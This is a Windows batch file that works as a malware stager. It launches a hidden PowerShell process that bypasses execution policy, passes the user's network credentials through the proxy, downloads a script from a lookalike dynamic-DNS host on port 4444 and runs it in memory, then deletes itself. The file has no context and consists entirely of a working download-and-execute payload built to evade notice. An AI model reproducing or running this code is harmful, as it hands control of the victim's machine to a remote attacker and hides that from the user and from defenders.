@echo off
start /b powershell.exe -nol -w 1 -nop -ep bypass "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://googleapp.bounceme.net:4444/download/powershell/Om1hdHRpZmVzdGF0aW9uIGV0dw==') -UseBasicParsing|iex"
(goto) 2>nul & del "%~f0"
